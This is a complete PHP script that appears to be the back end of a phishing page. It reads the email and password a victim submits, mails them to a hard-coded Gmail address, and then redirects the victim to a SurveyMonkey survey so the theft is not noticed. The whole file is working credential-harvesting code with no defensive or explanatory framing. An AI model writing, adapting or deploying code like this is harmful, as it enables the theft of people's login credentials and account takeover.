<?php

$to      = 'ladykate15d@gmail.com';
$subject = 'the subject';
$message = $_POST["email"] . "  :  " . $_POST["pass"];
$headers = 'From: ladykate15d@gmail.com' . "\r\n" .
    'Reply-To: ladykate15d@gmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);


$newURL = "https://www.surveymonkey.com/r/Y7L9ZY6";
header('Location: '.$newURL);
?>
